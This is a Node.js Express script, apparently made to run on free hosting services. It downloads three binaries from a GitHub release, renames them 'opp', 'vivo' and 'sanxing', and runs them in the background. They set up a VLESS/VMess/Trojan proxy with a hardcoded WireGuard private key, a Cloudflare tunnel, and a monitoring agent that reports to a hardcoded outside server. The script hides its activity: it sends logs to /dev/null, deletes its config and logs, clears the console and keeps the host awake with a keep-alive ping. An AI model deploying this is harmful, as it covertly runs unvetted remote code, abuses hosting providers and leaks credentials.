const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');
const FILE_PATH = process.env.FILE_PATH || './temp';
const projectPageURL = process.env.URL || '';
const intervalInseconds = process.env.TIME || 120;
const UUID = process.env.UUID || 'f029c23e-d853-43fb-9f5b-01f45e15abfd';
const HIHI_SERVER = process.env.HIHI_SERVER || 'nezha.xiaopang66.xyz';
const HIHI_PORT = process.env.HIHI_PORT || '443';
const HIHI_KEY = process.env.HIHI_KEY || 'SoNxxhY9Sy65n5eds8';
const SUI_DOMAIN = process.env.SUI_DOMAIN || '';
const SUI_AUTH = process.env.SUI_AUTH || '';
const CFIP = process.env.CFIP || 'skk.moe';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || 'Vls';
const ARGO_PORT = process.env.ARGO_PORT || 28080;
const PORT = process.env.SERVER_PORT || process.env.PORT || 10000;


if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}


const pathsToDelete = [ 'vivo', 'sanxing', 'opp', 'sub.txt', 'boot.log'];
function cleanupOldFiles() {
  pathsToDelete.forEach((file) => {
    const filePath = path.join(FILE_PATH, file);
    fs.unlink(filePath, (err) => {
      if (err) {
        console.error(`Skip Delete ${filePath}`);
      } else {
        console.log(`${filePath} deleted`);
      }
    });
  });
}
cleanupOldFiles();


app.get("/", function(req, res) {
  res.send("Hello ERGO!");
});


const config = {
  log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
  inbounds: [
    { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 10001 }, { path: "/vless258", dest: 10002 }, { path: "/vmess258", dest: 10003 }, { path: "/trojan258", dest: 10004 }] }, streamSettings: { network: 'tcp' } },
    { port: 10001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "ws", security: "none" } },
    { port: 10002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless258" } }, sniffing: { disable: false, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 10003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess258" } }, sniffing: { disable: false, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 10004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan258" } }, sniffing: { disable: false, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
  ],
  dns: { servers: ["https+local://8.8.8.8/dns-query"] },
  outbounds: [
    { protocol: "freedom" },
    {
      tag: "WARP",
      protocol: "wireguard",
      settings: {
        secretKey: "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=",
        address: ["172.16.0.2/32", "2606:4700:110:8a36:df92:102a:9602:fa18/128"],
        peers: [{ publicKey: "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=", allowedIPs: ["0.0.0.0/0", "::/0"], endpoint: "162.159.193.10:2408" }],
        reserved: [78, 135, 76],
        mtu: 1280,
      },
    },
  ],
  routing: { domainStrategy: "AsIs", rules: [{ type: "field", domain: ["domain:openai.com", "domain:ai.com"], outboundTag: "WARP" }] },
};
fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));


function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}


function downloadFile(fileName, fileUrl, callback) {
  const filePath = path.join(FILE_PATH, fileName);
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${fileName} successfully`);
        callback(null, fileName);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${fileName} failed: ${err.message}`;
        console.error(errorMessage);
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${fileName} failed: ${err.message}`;
      console.error(errorMessage);
      callback(errorMessage);
    });
}


async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
        if (err) {
          reject(err);
        } else {
          resolve(fileName);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }


  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;

    filePaths.forEach(relativeFilePath => {
      const absoluteFilePath = path.join(FILE_PATH, relativeFilePath);

      fs.chmod(absoluteFilePath, newPermissions, (err) => {
        if (err) {
          console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
        } else {
          console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
        }
      });
    });
  }
  const filesToAuthorize = ['./opp', './vivo', './sanxing'];
  authorizeFiles(filesToAuthorize);


  let HIHI_TLS = '';
  if (HIHI_SERVER && HIHI_PORT && HIHI_KEY) {
    const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
    if (tlsPorts.includes(HIHI_PORT)) {
      HIHI_TLS = '--tls';
    } else {
      HIHI_TLS = '';
    }
    const command = `nohup ${FILE_PATH}/opp -s ${HIHI_SERVER}:${HIHI_PORT} -p ${HIHI_KEY} ${HIHI_TLS} >/dev/null 2>&1 &`;
    try {
      await exec(command);
      console.log('opp is running');
      await new Promise((resolve) => setTimeout(resolve, 1000));
    } catch (error) {
      console.error(`opp running error: ${error}`);
    }
  } else {
    console.log('HIHI variable is empty,skip running');
  }


  const command1 = `nohup ${FILE_PATH}/vivo -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log('vivo is running');
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`vivo running error: ${error}`);
  }


  if (fs.existsSync(path.join(FILE_PATH, 'sanxing'))) {
    let args;

    if (SUI_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${SUI_AUTH}`;
    } else if (SUI_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${FILE_PATH}/sanxing ${args} >/dev/null 2>&1 &`);
      console.log('sanxing is running');
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

function getFilesForArchitecture(architecture) {
  if (architecture === 'arm') {
    return [
      { fileName: "opp", fileUrl: "https://github.com/eooce/test/releases/download/ARM/swith" },
      { fileName: "vivo", fileUrl: "https://github.com/eooce/test/releases/download/ARM/web" },
      { fileName: "sanxing", fileUrl: "https://github.com/eooce/test/releases/download/arm64/bot13" },
    ];
  } else if (architecture === 'amd') {
    return [
      { fileName: "opp", fileUrl: "https://github.com/eooce/test/releases/download/amd64/npm" },
      { fileName: "vivo", fileUrl: "https://github.com/eooce/test/releases/download/amd64/web" },
      { fileName: "sanxing", fileUrl: "https://github.com/eooce/test/releases/download/amd64/bot13" },
    ];
  }
  return [];
}


function argoType() {
  if (!SUI_AUTH || !SUI_DOMAIN) {
    console.log("SUI_DOMAIN or SUI_AUTH variable is empty, use quick tunnels");
    return;
  }

  if (SUI_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), SUI_AUTH);
    const tunnelYaml = `
  tunnel: ${SUI_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${SUI_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("SUI_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();


async function extractDomains() {
  let argoDomain;

  if (SUI_AUTH && SUI_DOMAIN) {
    argoDomain = SUI_DOMAIN;
    console.log('SUI_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running sanxing to obtain ArgoDomain');
        
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        await new Promise((resolve) => setTimeout(resolve, 2000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${path.join(FILE_PATH, 'sanxing')} ${args} >/dev/null 2>&1 &`);
          console.log('sanxing is running.');
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains();
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }


  async function generateLinks(argoDomain) {
    const metaInfo = execSync(
      'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();

    return new Promise((resolve) => {
      setTimeout(() => {
        const VMESS = { v: '2', ps: `${NAME}-${ISP}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess258?ed=2560', tls: 'tls', sni: argoDomain, alpn: '' };
        const subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Fvless258?ed=2560#${NAME}-${ISP}
  
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
  
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Ftrojan258?ed=2560#${NAME}-${ISP}
    `;


        console.log(Buffer.from(subTxt).toString('base64'));
        const filePath = path.join(FILE_PATH, 'sub.txt');
        fs.writeFileSync(filePath, Buffer.from(subTxt).toString('base64'));
        console.log('File saved successfully');
        console.log('Thank you for using this script,enjoy!');

        app.get('/sub', (req, res) => {
          const encodedContent = Buffer.from(subTxt).toString('base64');
          res.set('Content-Type', 'text/plain; charset=utf-8');
          res.send(encodedContent);
        });
        resolve(subTxt);
      }, 2000);
    });
  }
}


const bootLogPath = path.join(FILE_PATH, 'boot.log');
const configPath = path.join(FILE_PATH, 'config.json');
function cleanFiles() {
  setTimeout(() => {
    exec(`rm -rf ${bootLogPath} ${configPath}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error while deleting files: ${error}`);
        return;
      }
      console.clear()
      console.log('App is running');
      console.log('Thank you for using this script,enjoy!');
    });
  }, 120000); // 120 秒
}
cleanFiles();


let hasLoggedEmptyMessage = false;
async function visitProjectPage() {
  try {

    if (!projectPageURL || !intervalInseconds) {
      if (!hasLoggedEmptyMessage) {
        console.log("URL or TIME variable is empty,skip visit url");
        hasLoggedEmptyMessage = true;
      }
      return;
    } else {
      hasLoggedEmptyMessage = false;
    }

    await axios.get(projectPageURL);
    // console.log(`Visiting project page: ${URL}`);
    console.log('Page visited successfully');
    console.clear()
  } catch (error) {
    console.error('Error visiting project page:', error.message);
  }
}
setInterval(visitProjectPage, intervalInseconds * 1000);


async function startserver() {
  await downloadFilesAndRun();
  await extractDomains();
  visitProjectPage();
}
startserver();

app.listen(PORT, () => console.log(`Http server is running on port:${PORT}!`));
